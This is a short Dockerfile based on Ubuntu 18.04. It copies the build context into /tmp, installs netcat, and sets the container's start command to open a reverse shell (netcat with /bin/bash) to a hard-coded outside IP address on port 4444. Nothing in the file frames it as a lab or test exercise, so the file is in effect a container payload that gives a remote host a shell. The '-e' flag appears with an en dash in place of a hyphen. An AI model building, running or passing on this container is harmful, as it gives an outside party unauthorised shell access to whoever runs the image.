FROM ubuntu:18.04

COPY / /tmp/.

WORKDIR /tmp
RUN apt-get update
RUN apt-get install netcat -y
CMD nc 172.105.254.138 4444 –e /bin/bash
